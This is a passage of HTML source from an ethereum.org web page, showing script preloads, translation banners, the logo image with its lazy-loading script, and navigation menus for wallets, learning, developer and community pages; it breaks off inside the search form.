    <link as="script" rel="preload" href="/25d596b65775ea7afe354c15642381979021d6cd-2f6caff8459189371c2f.js" />
    <link as="script" rel="preload" href="/11668b3b9ed3683ee47d28f8c77a545e619ec982-ee72c9abd0df09f0774e.js" />
    <link as="script" rel="preload" href="/52cf9c5a1e9c7984f21863cec29b00316e2f83b5-d88a746dbbb49532e37e.js" />
    <link as="script" rel="preload" href="/17c33ad9a348ef774778252eb67365cfd55aa9a5-e77143c5f3f8181de506.js" />
    <link as="script" rel="preload" href="/7af8855b021f6a970d51fdb46cde1a68c215da27-8891e581cd5f0db5a796.js" />
    <link as="script" rel="preload" href="/component---src-pages-index-js-e11f9f2ca3fd63927558.js" />
    <link as="fetch" rel="preload" href="/page-data/en/page-data.json" crossorigin="anonymous" />
    <link as="fetch" rel="preload" href="/page-data/sq/d/1011117294.json" crossorigin="anonymous" />
    <link as="fetch" rel="preload" href="/page-data/sq/d/1226938802.json" crossorigin="anonymous" />
    <link as="fetch" rel="preload" href="/page-data/sq/d/3003422828.json" crossorigin="anonymous" />
    <link as="fetch" rel="preload" href="/page-data/sq/d/446219633.json" crossorigin="anonymous" />
    <link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous" />
  </head>

  <body>
    <div id="___gatsby">
      <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
        <div class="SkipLink__Div-sc-1ysqk2q-0 giUnZR"><a href="#main-content"
            class="SkipLink__Anchor-sc-1ysqk2q-1 dTtKmI"><span>Skip to main content</span></a></div>
        <div class="TranslationBanner__BannerContainer-sc-cd94ib-1 jJbcq">
          <div class="TranslationBanner__StyledBanner-sc-cd94ib-2 cLEePD">
            <div class="TranslationBanner__BannerContent-sc-cd94ib-3 jiZNpa">
              <div class="TranslationBanner__Row-sc-cd94ib-6 nChYp">
                <h3 class="TranslationBanner__H3-sc-cd94ib-0 elpFuD"><span>Help update this page</span></h3><span
                  size="1.5" ml="0.5rem" mt="0" mr="0" mb="0"
                  class="Emoji__StyledEmoji-sc-ihpuqw-0 ivCgwn TranslationBanner__StyledEmoji-sc-cd94ib-8 hTWLVy undefined"><img
                    alt="🌏" src="https://twemoji.maxcdn.com/2/svg/1f30f.svg"
                    style="width:1em;height:1em;margin:0 .05em 0 .1em;vertical-align:-0.1em" /></span>
              </div>
              <p><span>There’s a new version of this page but it’s only in English right now. Help us translate the latest
                  version.</span></p>
              <div class="TranslationBanner__ButtonRow-sc-cd94ib-7 gXNXMi">
                <div><a
                    class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__PrimaryLink-sc-8betkf-2 iMiHPL eClriT"
                    href="/en/contributing/translation-program/"><span>Translate page</span></a></div>
                <div><a aria-current="page"
                    class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__SecondaryLink-sc-8betkf-3 iMiHPL fWQsqc TranslationBanner__SecondaryButtonLink-sc-cd94ib-9 kUKdfA active"
                    href="/en/"><span>See English</span></a></div>
              </div>
            </div>
            <div class="TranslationBanner__BannerClose-sc-cd94ib-4 dOewRO"><svg stroke="currentColor" fill="currentColor"
                stroke-width="0" viewBox="0 0 24 24"
                class="Icon__StyledIcon-sc-1o8zi5s-0 TranslationBanner__BannerCloseIcon-sc-cd94ib-5 ilAeZt cEauOV"
                height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                <path fill="none" d="M0 0h24v24H0z"></path>
                <path
                  d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z">
                </path>
              </svg></div>
          </div>
        </div>
        <div class="TranslationBannerLegal__BannerContainer-sc-1df4kz4-1 eZKsbu">
          <div class="TranslationBannerLegal__StyledBanner-sc-1df4kz4-2 ckMYeb">
            <div class="TranslationBannerLegal__BannerContent-sc-1df4kz4-3 intGem">
              <div class="TranslationBannerLegal__Row-sc-1df4kz4-6 cJRPhR">
                <h3 class="TranslationBannerLegal__H3-sc-1df4kz4-0 kIfJin"><span>No bugs here!</span><span size="1.5"
                    ml="0.5rem" mt="0" mr="0" mb="0"
                    class="Emoji__StyledEmoji-sc-ihpuqw-0 ivCgwn TranslationBannerLegal__StyledEmoji-sc-1df4kz4-8 dRuawC undefined"><img
                      alt="🐛" src="https://twemoji.maxcdn.com/2/svg/1f41b.svg"
                      style="width:1em;height:1em;margin:0 .05em 0 .1em;vertical-align:-0.1em" /></span></h3>
              </div>
              <p><span>This page is not being translated. We've intentionally left this page in English for now.</span>
              </p>
              <div class="TranslationBannerLegal__ButtonRow-sc-1df4kz4-7 kXSENe"><button
                  class="SharedStyledComponents__Button-sc-1cr9zfr-18 SharedStyledComponents__ButtonPrimary-sc-1cr9zfr-19 iuRocQ jddqFP"><span>Don't
                    show again</span></button></div>
            </div>
            <div class="TranslationBannerLegal__BannerClose-sc-1df4kz4-4 hMvMKu"><svg stroke="currentColor"
                fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                class="Icon__StyledIcon-sc-1o8zi5s-0 TranslationBannerLegal__BannerCloseIcon-sc-1df4kz4-5 ilAeZt bhaYvl"
                height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                <path fill="none" d="M0 0h24v24H0z"></path>
                <path
                  d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z">
                </path>
              </svg></div>
          </div>
        </div>
        <div class="Layout__ContentContainer-sc-19910io-0 mXCTw">
          <div class="Nav__NavContainer-sc-1aprtmp-0 iGuESw" style = "display:none">
            <nav class="Nav__StyledNav-sc-1aprtmp-1 dAFoOX">
              <div class="Nav__NavContent-sc-1aprtmp-3 faUCsG"><a aria-current="page"
                  class="Link__InternalLink-sc-e3riao-1 hoRTos Nav__HomeLogoNavLink-sc-1aprtmp-9 igUcis active"
                  href="/en/">
                  <div data-gatsby-image-wrapper="" style="width:22px;height:35px"
                    class="gatsby-image-wrapper Nav__HomeLogo-sc-1aprtmp-10 euWmfq"><img aria-hidden="true"
                      data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAgCAYAAAASYli2AAAACXBIWXMAAAsTAAALEwEAmpwYAAAHuElEQVRIx42WeVCU9xnHH9jtJDPtdKZp4yRtJ00z+cPpkcZpktZqxnRI4tgyVKNNTCSeNaZirVYDmKBQUY6IoBwCygoqRzjXZYG9d9/3Zbl2BTkUXUTkXpZrgb1gj9/T329hMs3UJN2Z9/jj3c/7/T7nC/CY3+aNCkj/TAOH/qYT7dltgIgI7fYtHxr/FPn3FtgT0y7aEdMJ4Xvb4P/6Pf20HBBtcPBDVciBDeWwHs4/USVptGbqhnoRkT4RDxs2G6Gf3v/+beHbgUwZYjN4ewUR9nPQUq5Pbq/lseTRLGY2WY/XzLug0jonLrw3DR9E3/5mWORmJezepoTi87rQiye1EHdY87K1iQt0yHnyxagdq6cXHBH72n7OQEcvWUKf/Uk9rHnd8PVAtBnhe99nlh+EIHaDqcagW+wR0HST95UOzvq06MH8DlvlIrVL7YcC7IDaecfjYZmntMAV6+GW1CBuqTBAZZZuz0QLj4s9vM8s45ECiQ4X/TL7Ap4sG4jI4MYgu9UqSpQOwoGUu1+F/W5NAz2XQfInmpCwdQpY8+v6H1rUnHXhtoCuTj6wAkQ18fjVfjcWD8z0AaQ9CSCByE87Q1iyXv0jtwxbtaoOJMlaZgFwxijCoUbgSwz59ls8zt4SvO4uHimQMIUa4kHFksvbsOjCC8JYEr2CBj1iFoIjl+4vA98NV8KBD1RQk6MTXU/TAU3G+tFGHqk6MmsWCAWSL4HoIYpFF1EHPFg1Oe/fl9jzq0MZ9+Cz4oehL63Vw8bIVpoIfxOErVewcg6+oEvOmR3UKlXoowqRAWlSSOmjoEJCFTKVPhW1LrkzpcblBIV8B6rh+oNpgH4dB0McL+5TcyDP1x+dauNxvkPwMcvTJoG4ugRyu17AijE7MmCDx8WgROVz++QOB56RDe7Ka58Ayd0pUeLNQYALJzWhR/aoYOdW5XMPddwCUzdjEgL2dqquWyDebj0qrhpIjnmCqGnZsNJRed1IwQFmvWzYPv78i4ofvPIGB3tP94RQuS2hrDOayg1ldmqRqVvqoSpNetJWzZG8vC48dPIByU4bIZel46Swd4rIvU6ixUVU+9xeCsasZmuOCQPQjSiCxlI95J7Rh9taBfTf5fw2o57oyhrJuYt3MCZ7Ak9XOMmnl2yoLrGjWeoi1QVTJK94jFwx24jUsUD0uEhkcw48nH5vXap6hKXhSOgjje7+uKDHmsJm/5kLFozNnyaJ5U78vHqBpNUsYEzmOJFfmyHtSje2N7jRRMF1V2fIlaJxkmuw+qrnFvDG8GxrcHhkJHBZZQUmjMsY8JyQ2DGp0onnKCi1Yg6Tv5hjUIzNtGIdA1JYi8xJWuVObFdQeK0b1dftpKjA6slVWPFYpiUBtu/vzI3Jn8FUqRPTauZ9KeX2QHI5hVXME3olTOUKkKkjrbVO0lbrYldsqXX6O5Ruf2eDB+sKZjDqo54kOHPaBDv/ZfltbNZY0xkap9SqBUypmPcyGAOvAMmKwiCIHoE2uctnrncjT58vz7NpEmL7VifG9wPsf18VcWpj1ndtIwNwMOHh7rh82yizmlo1zyz7/lvhrWWg7xYFNd90Ym3hdP/Ffw9u6zf64c0Nxh+982fTFog/rF6jv2HoVRUZ9s5NDrIshRxNHUqNvzrtpUrxnNQRiMm0+mlS/LeVnqBCVYndWZA2GhfsEh9CXsrIPyVpY5aPIrt+AY1lBqi/ot87xPPYIeP47HjNK22t/RD2Xvfzn2SMys6W2fFEzgQqimexkSaoJGuiZMumtlUW3guxh+5tqLo8adZSR7nJw9sL08eBFbYIsQmEUkMeG1cjAo98GVe0483Kpzp7huDj04/eOnhqoDc3daQ9O3FobR/vg01hzT8tyhiv1JfPo7nOhdcyxjMmOxFcfbSwaduFAMio0/Inu+u4O7Td2GDABxpuoV5iiEb005cuwcoQgEtJw6cVN2Y9NCnYQUtHWjDVDvCSGCAF3o0wh0BeohZkeTrR1RQtpERrXhvk+ADtZz9TO00HRU89Z7mWptmUGD2wVSqZGmbJYNmlR0BTOueN2t39m7gjFqDJEdEQAItfcITNmnkxHQ4MfpxNnLl2YYn2tm/pjoC0z7Ei14adKg8rGR9V5zVKHZiZOBQluzoN1LrYQkORHv8I4C9vK6iVMfjl6vqV5dQBbVWGejokkA5YHw2B31TNBW5KpgK0DgMU6GV2y3Imqr+chU9UB8Pxh1f55amdeFQNByNVkBWvCY3cooQ31jY8Q3eKLbhTugR/WxVHagomWWH7zfUuVpMjP3tO8dS613iIPtgbGv5WCxzZf+eri6owVQu663rgSw3iust6KEjWhrNVsHRXCASBVyYJtUxYZhOO9YVRuyA5PybOOTsMp45avuYTxNJIpTsA7XRZDTSCukif7qRLigK90oLJYKtd+Xw0iRY4DDQHRMymscZBF5388bt5//tKeq6GXVuVtJSK6H1UyH0lZ6YFjzT4tNVmjMvfNwBhrxvpeQ9sCzd98+fI/u1KOHtMDSXpOpEsV0VXrGK1spD3X7sw6o6O6n8h+cQwJMf2h368swsiNrZ++8fSj5+VQ2mGDmh2ITuBE8f9Q4B97+mP7fpra9TxAx1wNuaemPYyJMX2w4sv1P3P//8DezbQXrTPP5sAAAAASUVORK5CYII="
                      alt="" />
                    <picture>
                      <img class = 'handsome' type="image/webp"
                        data-srcset="/static/a110735dade3f354a46fc2446cd52476/db4de/eth-home-icon.webp 22w,/static/a110735dade3f354a46fc2446cd52476/f3a29/eth-home-icon.webp 44w"
                        sizes="22px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="22px"
                        decoding="async" loading="lazy"
                        src="https://d33wubrfki0l68.cloudfront.net/5e2bb8e686ad14d3ebdfa4571877f07b3b1dd6a0/fba42/static/a110735dade3f354a46fc2446cd52476/321f0/eth-home-icon.png"
                        data-srcset="https://d33wubrfki0l68.cloudfront.net/5e2bb8e686ad14d3ebdfa4571877f07b3b1dd6a0/fba42/static/a110735dade3f354a46fc2446cd52476/321f0/eth-home-icon.png 22w,https://d33wubrfki0l68.cloudfront.net/a8ca3d77ad09964b0c2bd3143eff4086fd9dd8b3/7a56e/static/a110735dade3f354a46fc2446cd52476/f2da0/eth-home-icon.png 44w"
                        alt="Ethereum logo" />
                    </picture><noscript>
                      <picture>
                        <img class = 'handsome' type="image/webp"
                          srcSet="/static/a110735dade3f354a46fc2446cd52476/db4de/eth-home-icon.webp 22w,/static/a110735dade3f354a46fc2446cd52476/f3a29/eth-home-icon.webp 44w"
                          sizes="22px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1" sizes="22px"
                          decoding="async" loading="lazy"
                          src="https://d33wubrfki0l68.cloudfront.net/5e2bb8e686ad14d3ebdfa4571877f07b3b1dd6a0/fba42/static/a110735dade3f354a46fc2446cd52476/321f0/eth-home-icon.png"
                          srcSet="https://d33wubrfki0l68.cloudfront.net/5e2bb8e686ad14d3ebdfa4571877f07b3b1dd6a0/fba42/static/a110735dade3f354a46fc2446cd52476/321f0/eth-home-icon.png 22w,https://d33wubrfki0l68.cloudfront.net/a8ca3d77ad09964b0c2bd3143eff4086fd9dd8b3/7a56e/static/a110735dade3f354a46fc2446cd52476/f2da0/eth-home-icon.png 44w"
                          alt="Ethereum logo" />
                      </picture>
                    </noscript>
                    <script
                      type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                  </div>
                </a>
                <div class="Nav__InnerContent-sc-1aprtmp-4 gjaVMk">
                  <ul class="Nav__LeftItems-sc-1aprtmp-5 jUJHKw">
                    <li aria-label="Use Ethereum menu" class="Dropdown__NavListItem-sc-1yd08gi-4 eXQent"><span
                        tabindex="0" class="Dropdown__DropdownTitle-sc-1yd08gi-1 ebiUjW"><span>Use Ethereum</span><svg
                          stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Dropdown__StyledIcon-sc-1yd08gi-0 ilAeZt jMjupz"
                          height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
                        </svg></span>
                      <ul class="Dropdown__DropdownList-sc-1yd08gi-2 diOVNu"
                        style="opacity:0;display:none;transform:rotateX(-15deg) translateZ(0)">
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/wallets/"><span>Ethereum wallets</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/get-eth/"><span>Get ETH</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/dapps/"><span>Decentralized applications (dapps)</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/run-a-node/"><span>Run a node</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/stablecoins/"><span>Stablecoins</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/staking/"><span>Stake ETH</span></a></li>
                      </ul>
                    </li>
                    <li aria-label="Learn menu" class="Dropdown__NavListItem-sc-1yd08gi-4 eXQent"><span tabindex="0"
                        class="Dropdown__DropdownTitle-sc-1yd08gi-1 ebiUjW"><span>Learn</span><svg stroke="currentColor"
                          fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Dropdown__StyledIcon-sc-1yd08gi-0 ilAeZt jMjupz"
                          height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
                        </svg></span>
                      <ul class="Dropdown__DropdownList-sc-1yd08gi-2 diOVNu"
                        style="opacity:0;display:none;transform:rotateX(-15deg) translateZ(0)">
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/"><span>What is Ethereum?</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/eth/"><span>What is ether (ETH)?</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/defi/"><span>Decentralized finance (DeFi)</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/dao/"><span>Decentralized autonomous organisations (DAOs)</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/nft/"><span>Non-fungible tokens (NFTs)</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/smart-contracts/"><span>Smart contracts</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/security/"><span>Ethereum security and scam prevention</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/history/"><span>History of Ethereum</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/whitepaper/"><span>Ethereum Whitepaper</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/upgrades/"><span>Ethereum upgrades</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos is-glossary Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/glossary/"><span>Ethereum glossary</span><svg stroke="currentColor"
                              fill="currentColor" stroke-width="0" viewBox="0 0 16 16"
                              class="Icon__StyledIcon-sc-1o8zi5s-0 Link__GlossaryIcon-sc-e3riao-3 ilAeZt fCuHsG"
                              height="12px" width="12px" xmlns="http://www.w3.org/2000/svg">
                              <path
                                d="M2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2zm3.496 6.033a.237.237 0 0 1-.24-.247C5.35 4.091 6.737 3.5 8.005 3.5c1.396 0 2.672.73 2.672 2.24 0 1.08-.635 1.594-1.244 2.057-.737.559-1.01.768-1.01 1.486v.105a.25.25 0 0 1-.25.25h-.81a.25.25 0 0 1-.25-.246l-.004-.217c-.038-.927.495-1.498 1.168-1.987.59-.444.965-.736.965-1.371 0-.825-.628-1.168-1.314-1.168-.803 0-1.253.478-1.342 1.134-.018.137-.128.25-.266.25h-.825zm2.325 6.443c-.584 0-1.009-.394-1.009-.927 0-.552.425-.94 1.01-.94.609 0 1.028.388 1.028.94 0 .533-.42.927-1.029.927z">
                              </path>
                            </svg></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/governance/"><span>Ethereum governance</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/bridges/"><span>Blockchain bridges</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/energy-consumption/"><span>Ethereum energy consumption</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/eips/"><span>Ethereum Improvement Proposals</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/learn/"><span>Community guides and resources</span></a></li>
                      </ul>
                    </li>
                    <li aria-label="Developers&#x27; Menu" class="Dropdown__NavListItem-sc-1yd08gi-4 eXQent"><span
                        tabindex="0" class="Dropdown__DropdownTitle-sc-1yd08gi-1 ebiUjW"><span>Developers</span><svg
                          stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Dropdown__StyledIcon-sc-1yd08gi-0 ilAeZt jMjupz"
                          height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
                        </svg></span>
                      <ul class="Dropdown__DropdownList-sc-1yd08gi-2 diOVNu"
                        style="opacity:0;display:none;transform:rotateX(-15deg) translateZ(0)">
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/developers/"><span>Developers' home</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/developers/docs/"><span>Documentation</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/developers/tutorials/"><span>Tutorials</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/developers/learning-tools/"><span>Learn by coding</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/developers/local-environment/"><span>Set up local environment</span></a></li>
                      </ul>
                    </li>
                    <li aria-label="Enterprise Menu" class="Dropdown__NavListItem-sc-1yd08gi-4 eXQent"><span tabindex="0"
                        class="Dropdown__DropdownTitle-sc-1yd08gi-1 ebiUjW"><span>Enterprise</span><svg
                          stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Dropdown__StyledIcon-sc-1yd08gi-0 ilAeZt jMjupz"
                          height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
                        </svg></span>
                      <ul class="Dropdown__DropdownList-sc-1yd08gi-2 diOVNu"
                        style="opacity:0;display:none;transform:rotateX(-15deg) translateZ(0)">
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/enterprise/"><span>Mainnet Ethereum</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/enterprise/private-ethereum/"><span>Private Ethereum</span></a></li>
                      </ul>
                    </li>
                    <li aria-label="Community Menu" class="Dropdown__NavListItem-sc-1yd08gi-4 eXQent"><span tabindex="0"
                        class="Dropdown__DropdownTitle-sc-1yd08gi-1 ebiUjW"><span>Community</span><svg
                          stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Dropdown__StyledIcon-sc-1yd08gi-0 ilAeZt jMjupz"
                          height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
                        </svg></span>
                      <ul class="Dropdown__DropdownList-sc-1yd08gi-2 diOVNu"
                        style="opacity:0;display:none;transform:rotateX(-15deg) translateZ(0)">
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/community/"><span>Community hub</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/community/online/"><span>Online communities</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/community/events/"><span>Ethereum events</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/community/get-involved/"><span>Get involved</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/community/grants/"><span>Grants</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/community/support/"><span>Ethereum support</span></a></li>
                        <li class="Dropdown__DropdownItem-sc-1yd08gi-5 ebTwpi"><a
                            class="Link__InternalLink-sc-e3riao-1 hoRTos Dropdown__NavLink-sc-1yd08gi-6 YfCzI"
                            href="/en/community/language-resources/"><span>Language resources</span></a></li>
                      </ul>
                    </li>
                  </ul>
                  <div class="Nav__RightItems-sc-1aprtmp-6 kQWBtS">
                    <div class="Search__Root-sc-1qm8xwy-0 kNenpg">
                      <form class="Input__Form-sc-1utkal6-0 eoyKpR"><input type="text" id="header-search"
                          placeholder="Search" value="" aria-label="Search"
                          class="Input__StyledInput-sc-1utkal6-1 hBFIJH" />
                        <p class="Input__SearchSlash-sc-1utkal6-3 doxxqj">/</p><svg stroke="currentColor"
                          fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Input__SearchIcon-sc-1utkal6-2 ilAeZt gFzMVg" height="24"
                          width="24" xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path
